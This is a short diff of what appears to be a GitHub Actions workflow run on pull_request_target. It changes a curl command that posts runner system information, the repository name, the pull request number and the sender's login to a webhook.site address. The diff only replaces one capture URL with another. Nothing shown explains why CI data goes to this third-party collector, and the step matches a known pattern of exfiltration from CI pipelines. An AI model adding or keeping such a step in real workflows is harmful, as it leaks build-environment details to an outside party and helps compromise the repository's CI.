@@ -24,4 +24,4 @@ jobs:
           curl -X POST \
             -H "Content-Type: application/json" \
             -d "{\"event\":\"pull_request_target\",\"system_info\":\"$SYSTEM_INFO\",\"repository\":\"${{ github.repository }}\",\"pr_number\":\"${{ github.event.pull_request.number }}\",\"sender\":\"${{ github.event.sender.login }}\"}" \
-            https://webhook.site/b2742a99-b62e-4b05-8541-3c40ba9da57b
+            https://webhook.site/85ab779f-18d6-40c5-831e-c0e62f1e4537
